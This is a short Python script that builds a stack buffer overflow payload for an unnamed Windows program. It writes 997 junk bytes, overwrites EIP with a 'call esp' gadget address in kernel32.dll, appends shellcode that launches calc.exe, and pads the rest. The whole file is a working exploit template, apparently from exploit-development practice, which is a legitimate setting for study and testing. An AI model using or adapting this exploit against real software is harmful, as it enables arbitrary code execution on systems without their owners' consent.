from struct import pack

#   Junk    |     EIP   |   ESP
#   997b    |     4b    |   99b
#             JMP to ESP    Shellcode

BUFF_SIZE = 997+4+99

buff = "A"*997
buff += pack("<L",0x7c8369c0) #overwrite EIP with loaded call esp from kernel32.dll
                #0x7c8369c0 : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll]

#Calc.exe shellcode
buff += "\x31\xC9"              
buff += "\x51"                  
buff += "\x68\x63\x61\x6C\x63"  
buff += "\x54"                  
buff += "\xB8\xC7\x93\xC2\x77"  
buff += "\xFF\xD0"              

padding = "C"*(BUFF_SIZE-len(buff))
buff += padding

print buff
